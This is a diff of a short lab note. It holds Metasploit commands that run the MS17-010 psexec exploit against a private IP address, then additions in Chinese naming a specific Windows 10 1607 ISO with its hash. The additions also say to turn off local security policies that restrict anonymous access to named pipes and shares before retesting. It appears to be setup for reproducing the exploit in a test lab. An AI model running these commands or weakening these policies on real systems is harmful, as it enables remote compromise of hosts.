@@ -1,3 +1,16 @@
 use exploit/windows/smb/ms17_010_psexec 
 set rhost 192.168.55.154
 run
+
+文件名
+cn_windows_10_multiple_editions_version_1607_updated_jul_2016_x64_dvd_9056935.iso
+SHA1
+A2DDAA7BE3BB73FD87C29D6EF8E1EDF4C764DCD9
+文件大小
+4.05GB
+发布时间
+2016-08-02
+
+并在本地安全策略中，关闭以下选项，重启之后再测试
+网络访问：限制对命名管道和共享的匿名访问   关闭
+网络访问：可匿名访问的共享  \
